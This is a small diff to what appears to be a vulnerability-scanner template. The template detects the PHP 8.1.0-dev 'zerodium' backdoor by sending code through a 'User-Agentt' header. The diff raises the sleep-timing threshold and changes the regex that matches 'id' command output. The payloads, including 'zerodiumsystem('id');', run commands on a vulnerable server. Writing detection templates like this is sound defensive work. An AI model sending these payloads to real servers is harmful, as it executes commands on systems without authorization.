@@ -16,13 +16,13 @@ http:
         User-Agentt: '{{reflection}}'
     payloads:
       reflection:
-        - 'zerodiumsleep(8);'
+        - 'zerodiumsleep(20);'
         - "zerodiumsystem('id');"
     matchers:
       - type: dsl
         dsl:
-          - 'duration>=7'
+          - 'duration>=19'
         condition: and
       - type: regex
         regex:
-          - "uid=[x*]:0:0"
+          - 'uid=(\d+)\(([^)]+)\)'
